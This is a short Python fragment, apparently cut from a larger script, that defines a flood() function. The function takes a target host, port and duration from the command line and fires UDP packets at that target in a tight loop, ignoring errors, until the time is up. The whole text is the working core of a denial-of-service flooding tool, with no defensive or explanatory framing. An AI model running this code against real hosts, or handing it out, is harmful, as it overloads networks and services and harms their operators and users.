def flood():
    host = sys.argv[2]
    port = sys.argv[3]
    duration = sys.argv[4]

    stoptime = time.time() + int(duration)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)

    while time.time() < stoptime:
        try:
            sock.sendto(choice(strings).encode(), (host, int(port)))
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass
    
    sock.close()

